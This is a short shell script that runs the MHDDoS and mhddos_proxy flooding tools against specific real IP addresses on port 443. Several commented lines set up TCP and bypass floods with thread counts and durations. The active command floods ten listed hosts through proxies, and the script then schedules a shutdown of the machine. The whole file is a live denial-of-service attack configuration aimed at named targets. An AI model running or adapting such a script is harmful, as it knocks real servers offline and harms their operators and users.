#!/bin/sh
#rm /home/ubuntu/mhddos/files/proxies/socks5.txt;
#python3 /home/ubuntu/mhddos/start.py bypass 176.67.241.93:443 5 1000 socks5.txt 100000 3600 &

#python3 /home/ubuntu/mhddos/start.py tcp 185.79.118.6:443 400 6200 &
#python3 /home/ubuntu/mhddos/start.py tcp 185.79.118.2:443 300 6200 &
#python3 /home/ubuntu/mhddos/start.py tcp 185.178.208.163:443 300 6200 &
#python3 /home/ubuntu/mhddos/start.py tcp 185.46.11.253:443 100 6200 &

cd /home/ubuntu/mhddos_proxy
python3 /home/ubuntu/mhddos_proxy/runner.py tcp://193.187.96.13:443 tcp://95.131.30.226:443 tcp://91.208.42.10:443 tcp://82.142.162.147:443 tcp://79.143.30.47:443 tcp://84.201.150.151:443 tcp://178.154.220.43:443 tcp://195.24.68.19:443 tcp://5.181.252.248:443 tcp://77.222.61.241:443 -p 300 --proxy-timeout 4 &
sudo shutdown -P +120 &
